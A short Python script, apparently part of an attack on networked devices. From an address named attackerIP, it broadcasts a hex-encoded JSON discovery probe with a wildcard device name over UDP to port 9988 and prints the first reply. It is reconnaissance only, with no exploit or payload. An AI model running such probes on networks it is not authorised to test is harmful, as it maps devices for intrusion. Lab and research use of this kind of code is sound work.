import json
import socket
attackerIP = "10.13.0.8"
attackerPort = 9989
bufferSize = 512
UDPServerSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
UDPServerSocket.bind((attackerIP, attackerPort))
UDPServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
devicesAddressPort= ("255.255.255.255", 9988)
print("send Broadcast")
bytesToSend = bytes.fromhex("7b226964223a226434656638613536346538373032346235336664343766636464656639383630222c226465764e616d65223a222a227d")
UDPServerSocket.sendto(bytesToSend, devicesAddressPort)

while (True):
    bytesAddressPair = UDPServerSocket.recvfrom(bufferSize)
    message = bytesAddressPair[0]
    print(message.decode())
    break
